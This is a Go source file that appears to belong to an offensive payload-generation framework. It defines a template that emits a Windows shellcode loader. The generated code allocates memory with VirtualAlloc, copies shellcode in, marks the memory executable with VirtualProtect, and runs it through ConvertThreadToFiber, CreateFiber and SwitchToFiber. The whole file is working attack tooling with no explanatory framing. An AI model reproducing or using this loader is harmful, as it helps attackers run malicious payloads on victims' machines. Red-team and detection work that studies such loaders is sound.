package loaders

import (
	"fmt"
	"strings"
)

type CreateFiberTemplate struct{}

func (t CreateFiberTemplate) Import() string {
	return fmt.Sprintf(`
import (
	"os"
	"unsafe"
    "syscall"
)
`)
}

func (t CreateFiberTemplate) Const() string {
	return fmt.Sprintf(`
const (
	MEM_COMMIT          = 0x1000
	MEM_RESERVE         = 0x2000
	PAGE_EXECUTE_READ   = 0x20
	PAGE_READWRITE      = 0x04
)


var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc            = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
	ConvertThreadToFiber    = kernel32.MustFindProc("ConvertThreadToFiber")
	CreateFiber             = kernel32.MustFindProc("CreateFiber")
	SwitchToFiber           = kernel32.MustFindProc("SwitchToFiber")
    RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
)
`)
}

func (t CreateFiberTemplate) Init() string {
	return ""
}

func (t CreateFiberTemplate) Process() string {
	return fmt.Sprintf(`
	/* convert main thread to fiber */
	fiberAddr, _, _ := ConvertThreadToFiber.Call()
    if fiberAddr == 0 {
        os.Exit(1)
    }

    /* allocate memory for the shellcode with VirtualAlloc & set the correct permissions */
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    if addr == 0 {
        os.Exit(1)
    }

    /* copy shellcode to allocated space */
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    /* change memory permissions so that it can execute */
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

    /* call CreateFiber & switch to the fiber to execute the payload */
    fiber, _, _ := CreateFiber.Call(0, addr, 0)
	_, _, _ = SwitchToFiber.Call(fiber)
`)
}

func (t CreateFiberTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
